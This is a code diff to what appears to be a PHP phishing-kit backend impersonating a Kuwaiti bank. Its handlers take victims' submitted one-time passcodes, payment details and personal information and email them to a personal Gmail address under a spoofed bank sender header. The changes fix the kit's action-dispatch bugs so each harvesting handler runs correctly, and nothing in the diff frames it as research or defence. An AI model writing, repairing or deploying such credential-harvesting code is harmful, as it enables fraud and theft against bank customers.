@@ -30,7 +30,7 @@ function sendOTP($data)
 {
     $to = "hassankiwan92@gmail.com";
     $sender = "admin@nbkkuwait.com";
-    $subject = "OTP";
+    $subject = "first OTP";
     $message = "";
     foreach ($data as $key => $msg) {
         $message .= "$key :  $msg\n";
@@ -39,12 +39,13 @@ function sendOTP($data)
     $headers .= "Reply-To: $sender\r\n";
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
-    // Send the email
-    header('Content-Type: application/json');
+    // Send the email 
     if (mail($to, $subject, $message, $headers)) {
         // Redirect if using GET only
+        header('Content-Type: application/json');
         echo json_encode(['status' => 'success', 'redirect' => './info.php']);
     } else {
+        header('Content-Type: application/json');
         echo json_encode(['status' => 'error', 'message' => 'Failed.']);
 
     }
@@ -135,24 +136,31 @@ function sendInfoData($data)
 
 
 if (isset($_POST)) {
-    if (isset($_POST['action']) == 'sendtEmailPatment') {
+    if (isset($_POST['action']) && $_POST['action'] == 'sendtEmailPatment') {
         sendtEmailPatment($_POST);
+        exit;
     }
-    if (isset($_POST['action']) == 'sendOTP') {
+
+
+    if (isset($_POST['action']) && $_POST['action'] == 'sendOTP') {
         sendOTP($_POST);
+        exit;
     }
 
-    if (isset($_POST['action']) == 'sendInfoData') {
+    if (isset($_POST['action']) && $_POST['action'] === 'sendInfoData') {
         sendInfoData($_POST);
+        exit;
     }
 
-    if (isset($_POST['action']) == 'sendInfo') {
+    if (isset($_POST['action']) && $_POST['action'] === 'sendInfo') {
         sendInfo($_POST);
+        exit;
     }
 
 
-    if (isset($_POST['action']) == 'sendOTP2') {
+    if (isset($_POST['action']) && $_POST['action'] === 'sendOTP2') {
         sendOTP2($_POST);
+        exit;
     }
 
     exit;
